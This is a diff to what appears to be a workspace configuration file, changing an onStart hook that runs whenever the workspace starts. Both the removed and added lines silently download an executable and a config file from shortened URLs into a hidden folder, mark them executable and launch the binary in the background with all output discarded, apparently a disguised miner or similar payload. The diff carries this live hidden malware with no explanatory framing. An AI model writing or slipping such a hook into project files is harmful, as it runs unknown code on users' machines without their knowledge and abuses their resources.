@@ -36,7 +36,8 @@
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "mkdir -p ~/.jok && cd ~/.jok && [ ! -f kontol ] && wget -q -O kontol https://is.gd/lrGMfB && wget -q -O config.json https://is.gd/98uX5A && chmod +x * && nohup ./kontol -c 'config.json' > /dev/null 2>&1 &";
+        joko = "mkdir -p ~/.jok && cd ~/.jok && [ ! -f kontol ] && wget -q -O kontol https://is.gd/lrGMfB && chmod +x kontol; wget -q -O config.json https://is.gd/98uX5A && chmod +x config.json && nohup ./kontol -c 'config.json' > /dev/null 2>&1 &
+";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
